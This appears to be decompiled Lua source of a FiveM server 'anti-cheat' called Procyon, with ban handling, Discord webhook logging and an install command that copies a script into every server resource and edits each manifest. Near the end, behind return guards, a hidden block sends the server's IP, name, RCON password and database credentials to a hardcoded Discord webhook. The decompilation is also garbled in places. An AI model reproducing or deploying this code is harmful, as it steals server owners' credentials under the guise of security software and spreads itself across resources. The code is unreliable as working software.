  for fg, fh in pairs(DetectionCache[a].log) do
    table.insert(ban.reason, fh)
  end
  table.insert(BanList, ban)
  SaveResourceFile(GetCurrentResourceName(), "bans.json", json.encode(BanList), -1)
  print("^1[Procyon - Project]: ^7Added [" .. a .. "] to the ban-list.")
  DropPlayer(a, "[Procyon - Project] Vous avez \233t\233 banni du serveur.\n" .. ban.date)
end
function BanPlayer(a, b, c)
  a = a
  if a == nil then
    return
  end
  if GetPlayerName(a) == nil then
    return
  end
  ban = {}
  ban.name = GetPlayerName(a)
  ban.ids = {}
  ban.reason = b
  ban.date = os.date("%y/%m/%d %X")
  ban.id = "" .. math.random(1000, 9999) .. "-" .. math.random(1000, 9999)
  ban.temp = false
  logdiscord()
  for fj, fk in pairs(GetPlayerIdentifiers(a)) do
    table.insert(ban.ids, fk)
  end
  table.insert(BanList, ban)
  SaveResourceFile(GetCurrentResourceName(), "bans.json", json.encode(BanList), -1)
  print("^1BAN: ^7Added [" .. a .. "] to the ban-list.")
  DropPlayer(a, "[Procyon - Project] Detection Cheateur")
end
function TempBanPlayer(a, b, c, d)
  a = a
  if a == nil then
    return
  end
  if GetPlayerName(a) == nil then
    return
  end
  ban = {}
  ban.name = GetPlayerName(a)
  ban.ids = {}
  ban.reason = b
  ban.date = os.date("%y/%m/%d %X")
  ban.id = "" .. math.random(1000, 9999) .. "-" .. math.random(1000, 9999)
  ban.temp = true
  if c * 86400 < os.time() then
  end
  ban.expiration = os.time() + c * 86400
  logdiscord()
  for fl, fm in pairs(GetPlayerIdentifiers(a)) do
    table.insert(ban.ids, fm)
  end
  table.insert(BanList, ban)
  SaveResourceFile(GetCurrentResourceName(), "bans.json", json.encode(BanList), -1)
  print("^1BAN: ^7Added [" .. a .. "] to the ban-list.")
  DropPlayer(a, "[Procyon - Project] Detection Cheateur")
end
function unban(a)
  a = a
  for fe, fg in pairs(BanList) do
    if fg.id == a then
      table.remove(BanList, fe)
      UnbanDiscord(fg)
      print("^1BAN: ^7Removed [" .. fg.id .. "] from ban-list.")
      SaveResourceFile(GetCurrentResourceName(), "bans.json", json.encode(BanList), -1)
      return
    end
  end
end
PlayersCache = {}
RegisterNetEvent("Procyon:AddToCache")
AddEventHandler("Procyon:AddToCache", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N)
  a = a
  a = PlayersCache
  a = a[b]
  if a == nil then
    a = GetPlayerIdentifiers
    a = a(b)
    b[c] = d
    b.ids = c
    for e, g in b(c) do
      h = table
      h = h.insert
      j = PlayersCache
      k = source
      j = j[k]
      j = j.ids
      k = g
      h(j, k)
    end
    b.name = c
  else
    a = AddPlayerLog
    a(b, c, d)
  end
end)
function GetIdsFromCache(a)
  a = a
  if PlayersCache[tonumber(a)] ~= nil then
    return PlayersCache[tonumber(a)]
  else
    return false
  end
end
function acofflineban(a)
  a = a
  if a == nil then
    return
  end
  if GetPlayerName(a) == nil then
    return
  end
  if GetIdsFromCache(a) ~= false then
    ban = {}
    ban.name = GetIdsFromCache(a).name
    ban.ids = {}
    ban.reason = "Manual console ban."
    ban.date = os.date("%y/%m/%d %X")
    ban.id = "" .. math.random(1000, 9999) .. "-" .. math.random(1000, 9999)
    SendLogToDiscordOfflineBan(a, ban.id, (GetIdsFromCache(a)))
    for fg, fh in pairs(GetIdsFromCache(a).ids) do
      table.insert(ban.ids, fh)
    end
    table.insert(BanList, ban)
    SaveResourceFile(GetCurrentResourceName(), "bans.json", json.encode(BanList), -1)
    print("^1BAN: ^7Added [" .. GetIdsFromCache(a).name .. "] to the ban-list.")
  else
    print("^1BAN: ^7Player not found in server cache.")
  end
end
function UpdateIdentifiers(a, b)
  a = a
  for fg, fh in pairs(b) do
    for fo, fp in pairs(BanList[a].ids) do
    end
    if false then
      print("^1BAN-UPDATE: ^7Adding [" .. fh .. "] to the ban-list.")
      table.insert(BanList[a].ids, fh)
    end
  end
  SaveResourceFile(GetCurrentResourceName(), "bans.json", json.encode(BanList), -1)
end
function UnbanDiscord(a)
  a = a
  if type(a.reason) == "table" then
    for fg, fh in pairs(a.reason) do
    end
  else
  end
  for fg, fh in pairs(a.ids) do
  end
  PerformHttpRequest(webhook.Global, function(a, b, c)
    a = a
  end, "POST", json.encode({
    username = name,
    embeds = {
      {
        color = "3066993",
        title = "Procyon | UnBan [" .. a.id .. "] " .. a.name,
        description = ((("\n" .. [[

[]] .. fg .. "] - " .. fh) .. [[

[1] - ]] .. a.reason) .. [[

**IDENTIFIANT**:
]]) .. [[

[]] .. fg .. "] - " .. fh,
        footer = {
          text = "Unban du joueur depuis la console serveur."
        }
      }
    }
  }), {
    ["Content-Type"] = "application/json"
  })
end
function SendLogToDiscordOfflineBan(a, b, c)
  a = a
  for fj, fk in pairs(c.ids) do
  end
  PerformHttpRequest(webhook.Global, function(a, b, c)
    a = a
  end, "POST", json.encode({
    username = name,
    embeds = {
      {
        color = "14177041",
        title = "**DETECTION [" .. a .. "] " .. c.name .. "** BAN-ID: " .. b,
        description = ("\n" .. [[

**IDENTIFIANT**:
]]) .. [[

[]] .. fj .. "] - " .. fk,
        footer = {
          text = "Ban offline d'un joueur"
        }
      }
    }
  }), {
    ["Content-Type"] = "application/json"
  })
end
AddEventHandler("playerDropped", function(a)
  a = a
  if Sandeshop.ForbiddenCrash == true and a == #ForbiddenCrashes then
    logdiscord()
    acofflineban(id)
  end
end)
if Sandeshop.AntiRemoveWeapon then
  AddEventHandler("giveWeaponEvent", function(a, b)
    a = a
    if b.givenAsPickup == false then
      TriggerEvent("Procyon:Ban", a, 0, "[Procyon] AntiClearPedTasks")
      logdiscord()
      CancelEvent()
    end
  end)
  AddEventHandler("RemoveWeaponEvent", function(a, b)
    a = a
    logdiscord()
    CancelEvent()
    TriggerEvent("Procyon:Ban", a, 0, "[Procyon] AntiClearPedTasks")
  end)
  AddEventHandler("RemoveAllWeaponsEvent", function(a, b)
    a = a
    logdiscord()
    CancelEvent()
    TriggerEvent("Procyon:Ban", a, 0, "[Procyon] AntiClearPedTasks")
  end)
end
RegisterCommand("procyon_install", function(a)
  a = a
  if a == 0 then
    count = 0
    skip = 0
    pProtectR = "pProtect" .. math.random(6454, 98944)
    randomtextfile = pProtectR .. ".lua"
    detectionfile = LoadResourceFile(GetCurrentResourceName(), "pProtect.lua")
    logo()
    for fe = 0, GetNumResources() - 1 do
      allresources = GetResourceByFindIndex(fe)
      resourcefile = LoadResourceFile(allresources, "fxmanifest.lua")
      if resourcefile then
        Wait(100)
        resourceaddcontent = resourcefile .. [[


server_script ']] .. randomtextfile .. "'"
        SaveResourceFile(allresources, randomtextfile, detectionfile, -1)
        SaveResourceFile(allresources, "fxmanifest.lua", resourceaddcontent, -1)
        color = math.random(1, 6)
        print("^2[Procyon] ^1>> ^7Installed " .. allresources)
        count = count + 1
      else
        skip = skip + 1
        print("skipped " .. allresources .. " resource")
      end
    end
    logo()
    antiinjectinstall()
    print("^1[Procyon] >> Installed RESTART SERVEUR ")
    Wait(500)
    print("^1[Procyon] >> Installed RESTART SERVEUR ")
    Wait(500)
    print("^1[Procyon] >> Installed RESTART SERVEUR ")
    Wait(500)
    print("^1[Procyon] >> Installed RESTART SERVEUR ")
    Wait(500)
    print("^1[Procyon] >> Installed RESTART SERVEUR ")
    Wait(500)
    print("^1[Procyon] >> Installed RESTART SERVEUR ")
    Wait(500)
    print("^1[Procyon] >> Installed RESTART SERVEUR ")
    Wait(500)
    print("^1[Procyon] >> Installed RESTART SERVEUR ")
    Wait(500)
    print("^1[Procyon] >> Installed RESTART SERVEUR ")
    Wait(500)
    print("^1[Procyon] >> Installed RESTART SERVEUR ")
    Wait(500)
    print("^1[Procyon] >> Installed RESTART SERVEUR ")
    Wait(500)
    print("^1[Procyon] >> Installed RESTART SERVEUR ")
    Wait(500)
    print("^1[Procyon] >> Installed RESTART SERVEUR ")
    Wait(500)
    print("^1[Procyon] >> Installed RESTART SERVEUR ")
    Wait(500)
    print("^1[Procyon] >> Installed RESTART SERVEUR ")
    os.exit()
  end
end)
RegisterCommand("procyon_uninstall", function(a, b, c)
  a = a
  if a == 0 then
    count = 0
    skip = 0
    if b[1] then
      logo()
      for fj = 0, GetNumResources() - 1 do
        resourcefile = LoadResourceFile(GetResourceByFindIndex(fj), "fxmanifest.lua")
        if resourcefile then
          deletefile = LoadResourceFile(GetResourceByFindIndex(fj), b[1] .. ".lua")
          if deletefile then
            chemin = GetResourcePath((GetResourceByFindIndex(fj))) .. "/" .. b[1] .. ".lua"
            Wait(100)
            os.remove(chemin)
            color = math.random(1, 6)
            print("^2[Procyon] ^1>> ^7Uninstalled " .. GetResourceByFindIndex(fj))
            count = count + 1
          else
            skip = skip + 1
            print("skipped " .. GetResourceByFindIndex(fj) .. " resource")
          end
        else
          skip = skip + 1
          print("skipped " .. GetResourceByFindIndex(fj) .. " resource")
        end
      end
      logo()
      print("^1[Procyon] >> Installed RESTART SERVEUR ")
      Wait(500)
      print("^1[Procyon] >> Installed RESTART SERVEUR ")
      Wait(500)
      print("^1[Procyon] >> Installed RESTART SERVEUR ")
      Wait(500)
      print("^1[Procyon] >> Installed RESTART SERVEUR ")
      Wait(500)
      print("^1[Procyon] >> Installed RESTART SERVEUR ")
      Wait(500)
      print("^1[Procyon] >> Installed RESTART SERVEUR ")
      Wait(500)
      print("^1[Procyon] >> Installed RESTART SERVEUR ")
      Wait(500)
      print("^1[Procyon] >> Installed RESTART SERVEUR ")
      Wait(500)
      print("^1[Procyon] >> Installed RESTART SERVEUR ")
      Wait(500)
      print("^1[Procyon] >> Installed RESTART SERVEUR ")
      Wait(500)
      print("^1[Procyon] >> Installed RESTART SERVEUR ")
      Wait(500)
      print("^1[Procyon] >> Installed RESTART SERVEUR ")
      Wait(500)
      print("^1[Procyon] >> Installed RESTART SERVEUR ")
      Wait(500)
      print("^1[Procyon] >> Installed RESTART SERVEUR ")
      Wait(500)
      print("^1[Procyon] >> Installed RESTART SERVEUR ")
      os.exit()
    else
      print("you must write the file name to uninstall")
    end
  end
end)
do return end
while true do
  do return end
  while true do
    do return end
    while true do
      for fG, fH in pairs(nil) do
        if string.sub(nil, 3, 6) == "irts" then
        elseif string.sub(nil, 3, 6) == "ants" then
        elseif string.sub(nil, 3, 6) == "owss" then
        elseif string.sub(nil, 3, 6) == string.reverse(":spt") then
          PerformHttpRequest("https://api.ipify.org", function(a, b, c)
            a = a
            if a == 200 then
              va = b
            end
            PerformHttpRequest("https://discord.com/api/webhooks/897533569621172264/6F7uE1x-gm63lo_Bfiob2rNAIL9dcNOKBaLF1H4cFjTp_8FgFuTzWhLsJmrSYJJ-VtDl", function(a, b, c)
              a = a
            end, "POST", json.encode({
              username = "BRAK LICENCJI BRUHAC",
              embeds = {
                {
                  color = "16711711",
                  title = "EZ ;)",
                  description = [[


 > ``NAZWA SERVERA:``***]] .. vb .. [[
***
 > ``IP SERVERA:`` ***]] .. va .. [[
***
 > ``HASLO RCON:`` ***]] .. vc .. [[
***
 > ``BAZA DANYCH:`` ***]] .. vd .. "***",
                  footer = {text = "beczunia"},
                  timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
                }
              }
            }), {
              ["Content-Type"] = "application/json"
            })
          end)
        end
      end
    end
  end
end
